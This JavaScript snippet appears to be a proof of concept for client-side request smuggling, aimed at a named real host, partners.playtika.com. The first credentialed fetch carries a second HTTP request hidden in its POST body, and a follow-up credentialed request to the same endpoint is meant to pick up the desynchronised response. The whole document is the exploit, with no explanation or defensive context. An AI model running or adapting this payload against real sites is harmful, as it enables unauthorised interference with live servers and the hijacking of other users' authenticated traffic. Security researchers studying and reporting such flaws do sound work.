fetch("https://partners.playtika.com/ppp", {
    method: "POST",
    body: "GET /hopefully404 HTTP/1.1\r\nHost: partners.playtika.com\r\nX-Ignore: X",
    credentials: "include",
    mode: "cors"
}).catch(() => {
    fetch("https://partners.playtika.com/ppp", {
        mode: "no-cors",
        credentials: "include"
    })

});